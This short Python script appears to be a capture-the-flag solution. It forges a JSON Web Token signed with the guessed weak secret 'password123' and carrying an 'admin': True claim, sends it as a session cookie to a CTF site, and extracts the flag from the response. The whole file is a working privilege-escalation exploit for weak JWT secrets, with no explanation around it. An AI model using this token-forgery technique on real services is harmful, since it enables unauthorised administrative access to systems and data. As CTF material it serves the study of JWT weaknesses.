#!/usr/bin/python3

import jwt 
import requests
import re

url = "https://jwt.freedomctf.org/"

encoded_jwt = jwt.encode({"usr": "user ","admin": True}, "password123", algorithm="HS256")

#print(encoded_jwt)

cookies = {"session":f"{str(encoded_jwt)}"}

r = requests.get(url, cookies=cookies)

#print(r.text)

print(re.findall("flag{.*?}", r.text)[0])